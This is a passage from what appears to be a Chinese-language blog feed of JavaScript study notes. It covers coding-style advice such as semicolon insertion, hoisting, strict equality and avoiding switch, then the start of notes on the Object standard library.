<p>这种语法特性被称为“分号的自动添加”（Automatic Semicolon Insertion，简称 ASI）</p>
<p>因此，有人提倡省略句尾的分号。麻烦的是，如果下一行的开始可以与本行的结尾连在一起解释，JavaScript 就不会自动添加分号</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 等同于 var a = 3</span></span><br><span class="line"><span class="keyword">var</span></span><br><span class="line">a</span><br><span class="line">=</span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于 &#x27;abc&#x27;.length</span></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span></span><br><span class="line">.length</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于 return a + b;</span></span><br><span class="line"><span class="keyword">return</span> a +</span><br><span class="line">b;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于 obj.foo(arg1, arg2);</span></span><br><span class="line">obj.foo(arg1,</span><br><span class="line">arg2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于 3 * 2 + 10 * (27 / 6)</span></span><br><span class="line"><span class="number">3</span> * <span class="number">2</span></span><br><span class="line">+</span><br><span class="line"><span class="number">10</span> * (<span class="number">27</span> / <span class="number">6</span>)</span><br></pre></td></tr></table></figure>
<p>上面代码都会多行放在一起解释，不会每一行自动添加分号。这些例子还是比较容易看出来的，但是下面这个例子就不那么容易看出来了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">x = y</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">x = y(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;...&#125;)();</span><br></pre></td></tr></table></figure>
<p>下面是更多不会自动添加分号的例子</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引擎解释为 c(d+e)</span></span><br><span class="line"><span class="keyword">var</span> a = b + c</span><br><span class="line">(d+e).toString();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引擎解释为 a = b/hi/g.exec(c).map(d)</span></span><br><span class="line"><span class="comment">// 正则表达式的斜杠，会当作除法运算符</span></span><br><span class="line">a = b</span><br><span class="line">/hi/g.exec(c).map(d);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解释为&#x27;b&#x27;[&#x27;red&#x27;, &#x27;green&#x27;]，</span></span><br><span class="line"><span class="comment">// 即把字符串当作一个数组，按索引取值</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">&#x27;b&#x27;</span></span><br><span class="line">[<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>].forEach(<span class="function"><span class="keyword">function</span> (<span class="params">c</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(c);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解释为 function (x) &#123; return x &#125;(a++)</span></span><br><span class="line"><span class="comment">// 即调用匿名函数，结果f等于0</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> x &#125;</span><br><span class="line">(a++)</span><br></pre></td></tr></table></figure>
<p>只有下一行的开始与本行的结尾，无法放在一起解释，JavaScript 引擎才会自动添加分号</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (a &lt; <span class="number">0</span>) a = <span class="number">0</span></span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于下面的代码，</span></span><br><span class="line"><span class="comment">// 因为 0console 没有意义</span></span><br><span class="line"><span class="keyword">if</span> (a &lt; <span class="number">0</span>) a = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br></pre></td></tr></table></figure>
<p>另外，如果一行的起首是“自增”（<code>++</code>）或“自减”（<code>--</code>）运算符，则它们的前面会自动添加分号</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a = b = c = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">++</span><br><span class="line">b</span><br><span class="line">--</span><br><span class="line">c</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a, b, c)</span><br><span class="line"><span class="comment">// 1 2 0</span></span><br></pre></td></tr></table></figure>
<p>上面代码之所以会得到<code>1 2 0</code>的结果，原因是自增和自减运算符前，自动加上了分号。上面的代码实际上等同于下面的形式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a = b = c = <span class="number">1</span>;</span><br><span class="line">a;</span><br><span class="line">++b;</span><br><span class="line">--c;</span><br></pre></td></tr></table></figure>
<p>如果<code>continue</code>、<code>break</code>、<code>return</code>和<code>throw</code>这四个语句后面，直接跟换行符，则会自动添加分号。这意味着，如果<code>return</code>语句返回的是一个对象的字面量，起首的大括号一定要写在同一行，否则得不到预期结果</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span></span><br><span class="line">&#123; <span class="attr">first</span>: <span class="string">&#x27;Jane&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解释成</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#123; <span class="attr">first</span>: <span class="string">&#x27;Jane&#x27;</span> &#125;;</span><br></pre></td></tr></table></figure>
<p>由于解释引擎自动添加分号的行为难以预测，因此编写代码的时候不应该省略行尾的分号。</p>
<p>不应该省略结尾的分号，还有一个原因。有些 JavaScript 代码压缩器（uglifier）不会自动添加分号，因此遇到没有分号的结尾，就会让代码保持原状，而不是压缩成一行，使得压缩无法得到最优的结果。</p>
<p>另外，不写结尾的分号，可能会导致脚本合并出错。所以，有的代码库在第一行语句开始前，会加上一个分号。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>上面这种写法就可以避免与其他脚本合并时，排在前面的脚本最后一行语句没有分号，导致运行出错的问题。</p>
<h4 id="3-6-全局变量"><a href="#3-6-全局变量" class="headerlink" title="3.6 全局变量"></a>3.6 全局变量</h4><p>JavaScript 最大的语法缺点，可能就是全局变量对于任何一个代码块，都是可读可写。这对代码的模块化和重复使用，非常不利。</p>
<p>因此，建议避免使用全局变量。如果不得不使用，可以考虑用大写字母表示变量名，这样更容易看出这是全局变量，比如<code>UPPER_CASE</code>。</p>
<h4 id="3-7-变量声明"><a href="#3-7-变量声明" class="headerlink" title="3.7 变量声明"></a>3.7 变量声明</h4><p>JavaScript 会自动将变量声明“提升”（hoist）到代码块（block）的头部</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!x) &#123;</span><br><span class="line">  <span class="keyword">var</span> x = &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> x;</span><br><span class="line"><span class="keyword">if</span> (!x) &#123;</span><br><span class="line">  x = &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这意味着，变量<code>x</code>是<code>if</code>代码块之前就存在了。为了避免可能出现的问题，最好把变量声明都放在代码块的头部</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写成</span></span><br><span class="line"><span class="keyword">var</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面这样的写法，就容易看出存在一个全局的循环变量<code>i</code><br>另外，所有函数都应该在使用之前定义。函数内部的变量声明，都应该放在函数的头部</p>
<h4 id="3-8-with语句"><a href="#3-8-with语句" class="headerlink" title="3.8 with语句"></a>3.8 with语句</h4><p><code>with</code>可以减少代码的书写，但是会造成混淆</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> (o) &#123;</span><br><span class="line">　foo = bar;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码，可以有四种运行结果：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">o.foo = bar;</span><br><span class="line">o.foo = o.bar;</span><br><span class="line">foo = bar;</span><br><span class="line">foo = o.bar;</span><br></pre></td></tr></table></figure>
<p>这四种结果都可能发生，取决于不同的变量是否有定义。因此，不要使用<code>with</code>语句</p>
<h4 id="3-9-相等和严格相等"><a href="#3-9-相等和严格相等" class="headerlink" title="3.9 相等和严格相等"></a>3.9 相等和严格相等</h4><p>JavaScript 有两个表示相等的运算符：“相等”（<code>==</code>）和“严格相等”（<code>===</code>）<br>相等运算符会自动转换变量类型，造成很多意想不到的情况</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> == <span class="string">&#x27;&#x27;</span><span class="comment">// true</span></span><br><span class="line"><span class="number">1</span> == <span class="literal">true</span> <span class="comment">// true</span></span><br><span class="line"><span class="number">2</span> == <span class="literal">true</span> <span class="comment">// false</span></span><br><span class="line"><span class="number">0</span> == <span class="string">&#x27;0&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="literal">false</span> == <span class="string">&#x27;false&#x27;</span> <span class="comment">// false</span></span><br><span class="line"><span class="literal">false</span> == <span class="string">&#x27;0&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27; \t\r\n &#x27;</span> == <span class="number">0</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>因此，建议不要使用相等运算符（<code>==</code>），只使用严格相等运算符（<code>===</code>）</p>
<h4 id="3-10-语句的合并"><a href="#3-10-语句的合并" class="headerlink" title="3.10 语句的合并"></a>3.10 语句的合并</h4><p>有些程序员追求简洁，喜欢合并不同目的的语句。比如，原来的语句是</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a = b;</span><br><span class="line"><span class="keyword">if</span> (a) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>他喜欢写成下面这样：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (a = b) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>虽然语句少了一行，但是可读性大打折扣，而且会造成误读，让别人误解这行代码的意思是下面这样</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> （a === b）&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>建议不要将不同目的的语句，合并成一行</p>
<h4 id="3-11-自增和自减运算符"><a href="#3-11-自增和自减运算符" class="headerlink" title="3.11 自增和自减运算符"></a>3.11 自增和自减运算符</h4><p>自增（<code>++</code>）和自减（<code>--</code>）运算符，放在变量的前面或后面，返回的值不一样，很容易发生错误。事实上，所有的<code>++</code>运算符都可以用<code>+= 1</code>代替</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">++x</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">x += <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>改用<code>+= 1</code>，代码变得更清晰了<br>建议自增（<code>++</code>）和自减（<code>--</code>）运算符尽量使用<code>+=</code>和<code>-=</code>代替</p>
<h4 id="3-12-wwitch…case-结构"><a href="#3-12-wwitch…case-结构" class="headerlink" title="3.12 wwitch…case 结构"></a>3.12 wwitch…case 结构</h4><p><code>switch...case</code>结构要求，在每一个<code>case</code>的最后一行必须是<code>break</code>语句，否则会接着运行下一个<code>case</code>。这样不仅容易忘记，还会造成代码的冗长。<br>而且，<code>switch...case</code>不使用大括号，不利于代码形式的统一。此外，这种结构类似于<code>goto</code>语句，容易造成程序流程的混乱，使得代码结构混乱不堪，不符合面向对象编程的原则。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doAction</span>(<span class="params">action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;hack&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;slash&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;slash&#x27;</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;run&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;run&#x27;</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Invalid action.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码建议改写成对象结构</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doAction</span>(<span class="params">action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> actions = &#123;</span><br><span class="line">    <span class="string">&#x27;hack&#x27;</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;slash&#x27;</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;slash&#x27;</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;run&#x27;</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;run&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> actions[action] !== <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Invalid action.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> actions[action]();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此，建议<code>switch...case</code>结构可以用对象结构代替</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS语法-编程风格</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0015</title>
    <url>/2021/05/12/%E6%89%93%E5%8D%A10015/</url>
    <content><![CDATA[<p><font color=#7bbbea>所谓无底深渊，下去，也是前程万里。</font></p>
<h2 id="JS标准库"><a href="#JS标准库" class="headerlink" title="JS标准库"></a>JS标准库</h2><h3 id="1-Object对象"><a href="#1-Object对象" class="headerlink" title="1. Object对象"></a>1. Object对象</h3><h4 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h4><p>JavaScript 原生提供<code>Object</code>对象（注意起首的<code>O</code>是大写），本章介绍该对象原生的各种方法<br>JavaScript 的所有其他对象都继承自<code>Object</code>对象，即那些对象都是<code>Object</code>的实例。<br><code>Object</code>对象的原生方法分成两类：<code>Object</code>本身的方法与<code>Object</code>的实例方法。</p>
<span id="more"></span>
<h5 id="1-Object对象本身的方法"><a href="#1-Object对象本身的方法" class="headerlink" title="(1)Object对象本身的方法"></a>(1)Object对象本身的方法</h5><p>所谓“本身的方法”就是直接定义在<code>Object</code>对象的方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.print = <span class="function"><span class="keyword">function</span> (<span class="params">o</span>) </span>&#123; <span class="built_in">console</span>.log(o) &#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>print</code>方法就是直接定义在<code>Object</code>对象上</p>
<h5 id="2-Object的实例方法"><a href="#2-Object的实例方法" class="headerlink" title="(2)Object的实例方法"></a>(2)Object的实例方法</h5><p>所谓实例方法就是定义在<code>Object</code>原型对象<code>Object.prototype</code>上的方法。它可以被<code>Object</code>实例直接使用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.print = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">obj.print() <span class="comment">// Object</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Object.prototype</code>定义了一个<code>print</code>方法，然后生成一个<code>Object</code>的实例<code>obj</code>。<code>obj</code>直接继承了<code>Object.prototype</code>的属性和方法，可以直接使用<code>obj.print</code>调用<code>print</code>方法。也就是说，<code>obj</code>对象的<code>print</code>方法实质上就是调用<code>Object.prototype.print</code>方法<br>关于原型对象<code>object.prototype</code>的详细解释，参见《面向对象编程》章节。这里只要知道，凡是定义在<code>Object.prototype</code>对象上面的属性和方法，将被所有实例对象共享就可以了<br>以下先介绍<code>Object</code>作为函数的用法，然后再介绍<code>Object</code>对象的原生方法，分成对象自身的方法（又称为“静态方法”）和实例方法两部分</p>
<h4 id="1-2-Object"><a href="#1-2-Object" class="headerlink" title="1.2 Object()"></a>1.2 Object()</h4><p><code>Object</code>本身是一个函数，可以当作工具方法使用，将任意值转为对象。这个方法常用于保证某个值一定是对象<br>如果参数为空（或者为<code>undefined</code>和<code>null</code>），<code>Object()</code>返回一个空对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>();</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>(<span class="literal">undefined</span>);</span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">obj <span class="keyword">instanceof</span> <span class="built_in">Object</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码的含义，是将<code>undefined</code>和<code>null</code>转为对象，结果得到了一个空对象<code>obj</code><br><code>instanceof</code>运算符用来验证，一个对象是否为指定的构造函数的实例。<code>obj instanceof Object</code>返回<code>true</code>，就表示<code>obj</code>对象是<code>Object</code>的实例<br>如果参数是原始类型的值，<code>Object</code>方法将其转为对应的包装对象的实例（参见《原始类型的包装对象》一章）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>(<span class="number">1</span>);</span><br><span class="line">obj <span class="keyword">instanceof</span> <span class="built_in">Object</span> <span class="comment">// true</span></span><br><span class="line">obj <span class="keyword">instanceof</span> <span class="built_in">Number</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">obj <span class="keyword">instanceof</span> <span class="built_in">Object</span> <span class="comment">// true</span></span><br><span class="line">obj <span class="keyword">instanceof</span> <span class="built_in">String</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>(<span class="literal">true</span>);</span><br><span class="line">obj <span class="keyword">instanceof</span> <span class="built_in">Object</span> <span class="comment">// true</span></span><br><span class="line">obj <span class="keyword">instanceof</span> <span class="built_in">Boolean</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Object</code>函数的参数是各种原始类型的值，转换成对象就是原始类型值对应的包装对象<br>如果<code>Object</code>方法的参数是一个对象，它总是返回该对象，即不用转换</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>(arr); <span class="comment">// 返回原数组</span></span><br><span class="line">obj === arr <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> value = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>(value) <span class="comment">// 返回原对象</span></span><br><span class="line">obj === value <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>(fn); <span class="comment">// 返回原函数</span></span><br><span class="line">obj === fn <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>利用这一点，可以写一个判断变量是否为对象的函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isObject</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value === <span class="built_in">Object</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isObject([]) <span class="comment">// true</span></span><br><span class="line">isObject(<span class="literal">true</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<h4 id="1-3-Object构造函数"><a href="#1-3-Object构造函数" class="headerlink" title="1.3 Object构造函数"></a>1.3 Object构造函数</h4><p><code>Object</code>不仅可以当作工具函数使用，还可以当作构造函数使用，即前面可以使用<code>new</code>命令<br><code>Object</code>构造函数的首要用途，是直接通过它来生成新对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br></pre></td></tr></table></figure>
<p>注意，通过<code>var obj = new Object()</code>的写法生成新对象，与字面量的写法<code>var obj = &#123;&#125;</code>是等价的。或者说，后者只是前者的一种简便写法。<br><code>Object</code>构造函数的用法与工具方法很相似，几乎一模一样。使用时，可以接受一个参数，如果该参数是一个对象，则直接返回这个对象；如果是一个原始类型的值，则返回该值对应的包装对象（详见《包装对象》一章）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> o2 = <span class="keyword">new</span> <span class="built_in">Object</span>(o1);</span><br><span class="line">o1 === o2 <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>(<span class="number">123</span>);</span><br><span class="line">obj <span class="keyword">instanceof</span> <span class="built_in">Number</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>虽然用法相似，但是<code>Object(value)</code>与<code>new Object(value)</code>两者的语义是不同的，<code>Object(value)</code>表示将<code>value</code>转成一个对象，<code>new Object(value)</code>则表示新生成一个对象，它的值是<code>value</code></p>
<h4 id="1-4-Object的静态方法"><a href="#1-4-Object的静态方法" class="headerlink" title="1.4 Object的静态方法"></a>1.4 Object的静态方法</h4><p>所谓“静态方法”，是指部署在<code>Object</code>对象自身的方法</p>
<h5 id="1-4-1-Object-keys-Object-getOwnPropertyNames"><a href="#1-4-1-Object-keys-Object-getOwnPropertyNames" class="headerlink" title="1.4.1 Object.keys(),Object.getOwnPropertyNames()"></a>1.4.1 Object.keys(),Object.getOwnPropertyNames()</h5><p><code>Object.keys</code>方法和<code>Object.getOwnPropertyNames</code>方法都用来遍历对象的属性<br><code>Object.keys</code>方法的参数是一个对象，返回一个数组。该数组的成员都是该对象自身的（而不是继承的）所有属性名</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  p1: <span class="number">123</span>,</span><br><span class="line">  p2: <span class="number">456</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.keys(obj) <span class="comment">// [&quot;p1&quot;, &quot;p2&quot;]</span></span><br></pre></td></tr></table></figure>
<p><code>Object.getOwnPropertyNames</code>方法与<code>Object.keys</code>类似，也是接受一个对象作为参数，返回一个数组，包含了该对象自身的所有属性名</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  p1: <span class="number">123</span>,</span><br><span class="line">  p2: <span class="number">456</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(obj) <span class="comment">// [&quot;p1&quot;, &quot;p2&quot;]</span></span><br></pre></td></tr></table></figure>
<p>对于一般的对象来说，<code>Object.keys()</code>和<code>Object.getOwnPropertyNames()</code>返回的结果是一样的。只有涉及不可枚举属性时，才会有不一样的结果。<code>Object.keys</code>方法只返回可枚举的属性（详见《对象属性的描述对象》一章），<code>Object.getOwnPropertyNames</code>方法还返回不可枚举的属性名。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;World&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.keys(a) <span class="comment">// [&quot;0&quot;, &quot;1&quot;]</span></span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(a) <span class="comment">// [&quot;0&quot;, &quot;1&quot;, &quot;length&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，数组的<code>length</code>属性是不可枚举的属性，所以只出现在<code>Object.getOwnPropertyNames</code>方法的返回结果中。<br>由于 JavaScript 没有提供计算对象属性个数的方法，所以可以用这两个方法代替。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  p1: <span class="number">123</span>,</span><br><span class="line">  p2: <span class="number">456</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.keys(obj).length <span class="comment">// 2</span></span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(obj).length <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>一般情况下，几乎总是使用Object.keys方法，遍历对象的属性</p>
<h5 id="1-4-2-其他方法"><a href="#1-4-2-其他方法" class="headerlink" title="1.4.2 其他方法"></a>1.4.2 其他方法</h5><p>除了上面提到的两个方法，<code>Object</code>还有不少其他静态方法，将在后文逐一详细介绍</p>
<h6 id="1-对象属性模型的相关方法"><a href="#1-对象属性模型的相关方法" class="headerlink" title="(1) 对象属性模型的相关方法"></a>(1) 对象属性模型的相关方法</h6><ul>
<li><code>Object.getOwnPropertyDescriptor()</code>：获取某个属性的描述对象。</li>
<li><code>Object.defineProperty()</code>：通过描述对象，定义某个属性。</li>
<li><code>Object.defineProperties()</code>：通过描述对象，定义多个属性。</li>
</ul>
<h6 id="2-控制对象状态的方法"><a href="#2-控制对象状态的方法" class="headerlink" title="(2) 控制对象状态的方法"></a>(2) 控制对象状态的方法</h6><ul>
<li><code>Object.preventExtensions()</code>：防止对象扩展。</li>
<li><code>Object.isExtensible()</code>：判断对象是否可扩展。</li>
<li><code>Object.seal()</code>：禁止对象配置。</li>
<li><code>Object.isSealed()</code>：判断一个对象是否可配置。</li>
<li><code>Object.freeze()</code>：冻结一个对象。</li>
<li><code>Object.isFrozen()</code>：判断一个对象是否被冻结。</li>
</ul>
<h6 id="3-原型链相关方法"><a href="#3-原型链相关方法" class="headerlink" title="(3) 原型链相关方法"></a>(3) 原型链相关方法</h6><ul>
<li><code>Object.create()</code>：该方法可以指定原型对象和属性，返回一个新的对象。</li>
<li><code>Object.getPrototypeOf()</code>：获取对象的Prototype对象。</li>
</ul>
<h4 id="1-5-Object的实例方法"><a href="#1-5-Object的实例方法" class="headerlink" title="1.5 Object的实例方法"></a>1.5 Object的实例方法</h4><p>除了静态方法，还有不少方法定义在<code>Object.prototype</code>对象。它们称为实例方法，所有<code>Object</code>的实例对象都继承了这些方法。<br><code>Object</code>实例对象的方法，主要有以下六个:</p>
<ul>
<li><code>Object.prototype.valueOf()</code>：返回当前对象对应的值。</li>
<li><code>Object.prototype.toString()</code>：返回当前对象对应的字符串形式。</li>
<li><code>Object.prototype.toLocaleString()</code>：返回当前对象对应的本地字符串形式。</li>
<li><code>Object.prototype.hasOwnProperty()</code>：判断某个属性是否为当前对象自身的属性，还是继承自原型对象的属性。</li>
<li><code>Object.prototype.isPrototypeOf()</code>：判断当前对象是否为另一个对象的原型。</li>
<li><code>Object.prototype.propertyIsEnumerable()</code>：判断某个属性是否可枚举。</li>
</ul>
<p>本节介绍前四个方法，另外两个方法将在后文相关章节介绍。</p>
<h5 id="1-5-1-Object-prototype-valueOf"><a href="#1-5-1-Object-prototype-valueOf" class="headerlink" title="1.5.1 Object.prototype.valueOf()"></a>1.5.1 Object.prototype.valueOf()</h5><p><code>valueOf</code>方法的作用是返回一个对象的“值”，默认情况下返回对象本身。</p>
